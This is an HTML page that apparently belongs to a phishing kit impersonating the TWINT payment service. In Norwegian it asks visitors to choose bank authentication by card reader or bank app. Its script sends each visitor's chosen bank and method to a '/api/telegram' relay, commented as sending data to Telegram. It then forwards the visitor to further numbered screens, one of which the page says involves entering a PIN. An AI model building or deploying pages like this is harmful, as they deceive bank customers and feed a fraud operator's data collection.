<!DOCTYPE html>
<html lang="nb">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TWINT — Velg autentiseringsmetode</title>
    <style>
      :root {
        font-family: "Inter", "Segoe UI", system-ui, sans-serif;
        color: #0f172a;
        background: #f3f4f6;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        background: #f3f4f6;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 0;
      }

      .shell {
        width: min(420px, 100%);
        background: white;
        border-radius: 0;
        padding: 1.5rem 1.75rem;
        min-height: 100vh;
        box-shadow: 0 15px 45px rgba(15, 23, 42, 0.18);
      }

      .step {
        display: flex;
        flex-direction: column;
        gap: 0.45rem;
        padding: 0 0.25rem 0.75rem;
      }

      .step-label {
        font-size: 0.8rem;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        color: #94a3b8;
      }

      .step-progress {
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .progress-bar {
        flex: 1;
        height: 0.35rem;
        background: #e2e8f0;
        border-radius: 999px;
        margin-right: 0.75rem;
        overflow: hidden;
      }

      .progress-bar span {
        display: block;
        width: 100%;
        height: 100%;
        background: #fbbf24;
        border-radius: inherit;
      }

      .step-progress strong {
        font-size: 0.75rem;
        color: #475569;
      }

      h1 {
        margin: 0 0 0.5rem;
        font-size: 1.75rem;
      }

      .copy {
        margin: 0 0 1.5rem;
        line-height: 1.6;
        color: #475569;
      }

      form {
        display: flex;
        flex-direction: column;
        gap: 1rem;
      }

      .option {
        display: flex;
        gap: 0.75rem;
        align-items: center;
        padding: 1rem;
        border-radius: 14px;
        border: 1px solid #e2e8f0;
        font-weight: 600;
        cursor: pointer;
        transition: border 0.2s ease, background 0.2s ease;
      }

      .option:hover {
        border-color: #fbbf24;
        background: #fef3c7;
      }

      .option input {
        appearance: none;
        width: 1.25rem;
        height: 1.25rem;
        border: 1.5px solid #cbd5f5;
        border-radius: 50%;
        outline: none;
        transition: box-shadow 0.2s ease;
        flex-shrink: 0;
      }

      .option input:checked {
        border-color: #fbbf24;
        box-shadow: inset 0 0 0 0.3rem rgba(251, 191, 36, 0.35);
      }

      .option-content {
        flex: 1;
      }

      .option-title {
        color: #111827;
        font-size: 1rem;
        margin-bottom: 0.25rem;
      }

      .option-description {
        color: #64748b;
        font-size: 0.85rem;
        font-weight: 400;
      }

      .card-reader-options {
        margin-top: 0.75rem;
        margin-left: 2rem;
        padding: 0.75rem;
        background: #f8fafc;
        border-radius: 8px;
        display: none;
      }

      .option input:checked ~ .option-content + .card-reader-options {
        display: block;
      }

      .card-reader-option {
        padding: 0.5rem 0;
        font-size: 0.9rem;
        color: #475569;
      }

      .buttons {
        display: flex;
        flex-direction: column;
        gap: 0.75rem;
        margin-top: 1rem;
      }

      .buttons button {
        border: none;
        border-radius: 14px;
        padding: 0.95rem;
        font-size: 1rem;
        font-weight: 600;
        cursor: pointer;
      }

      .primary {
        background: #fbbf24;
        color: #0f172a;
        box-shadow: 0 10px 20px rgba(251, 191, 36, 0.45);
      }

      .primary:disabled {
        background: #f6f8fb;
        color: #94a3b8;
        box-shadow: none;
        cursor: not-allowed;
      }

      .secondary {
        background: white;
        border: 1px solid #d1d5db;
        color: #475569;
      }
    </style>
  </head>
  <body>
    <div class="shell">
      <div class="step">
        <div class="step-label">Step 3/3</div>
        <div class="step-progress">
          <div class="progress-bar"><span></span></div>
          <strong>Step 3/3</strong>
        </div>
      </div>

      <h1>Velg autentiseringsmetode</h1>
      <p class="copy">
        Hvordan vil du autentisere deg? Du kan velge mellom kortleser eller bankens app.
      </p>

      <form>
        <label class="option">
          <input type="radio" name="auth-method" value="card-reader" id="card-reader" />
          <div class="option-content">
            <div class="option-title">Card Reader</div>
            <div class="option-description">Bruk kortleser for autentisering</div>
          </div>
          <div class="card-reader-options">
            <div class="card-reader-option">• Sett inn bankkortet ditt i kortleseren</div>
            <div class="card-reader-option">• Følg instruksjonene på skjermen</div>
            <div class="card-reader-option">• Skriv inn PIN-koden når du blir bedt om det</div>
          </div>
        </label>

        <label class="option">
          <input type="radio" name="auth-method" value="bank-app" id="bank-app" />
          <div class="option-content">
            <div class="option-title"><span id="bank-name">Bankens app</span></div>
            <div class="option-description">Bruk bankens mobilapp for autentisering</div>
          </div>
        </label>

        <div class="buttons">
          <button type="button" class="primary" id="next-button" disabled>Neste</button>
          <button type="button" class="secondary" id="back-button">Tilbake</button>
        </div>
      </form>
    </div>

    <script>
      const selectedBank = localStorage.getItem("selectedBank");
      const bankNameEl = document.getElementById("bank-name");
      const cardReaderOption = document.getElementById("card-reader");
      const bankAppOption = document.getElementById("bank-app");
      const nextButton = document.getElementById("next-button");
      const backButton = document.getElementById("back-button");
      const authMethodInputs = document.querySelectorAll('input[name="auth-method"]');

      // Update bank name
      if (selectedBank) {
        bankNameEl.textContent = selectedBank + " app";
      }

      // Enable/disable next button based on selection
      authMethodInputs.forEach(input => {
        input.addEventListener("change", () => {
          nextButton.disabled = !input.checked;
        });
      });

      // Helper function to send data to Telegram
      async function sendToTelegram(data) {
        try {
          await fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          });
        } catch (error) {
          console.error('Error sending to Telegram:', error);
        }
      }

      nextButton.addEventListener("click", async () => {
        const selectedMethod = document.querySelector('input[name="auth-method"]:checked');
        
        if (!selectedMethod) {
          alert("Velg en autentiseringsmetode før du går videre.");
          return;
        }

        const method = selectedMethod.value;
        localStorage.setItem("authMethod", method);
        
        // Send to Telegram
        await sendToTelegram({
          action: 'auth_method_selected',
          bank: selectedBank || null,
          auth_method: method,
          timestamp: new Date().toISOString()
        });
        
        // Continue based on selected method
        if (method === "card-reader") {
          window.location.href = "screen-6.html";
        } else {
          window.location.href = "screen-7.html";
        }
      });

      backButton.addEventListener("click", () => {
        window.location.href = "screen-3.html";
      });
    </script>
  </body>
</html>
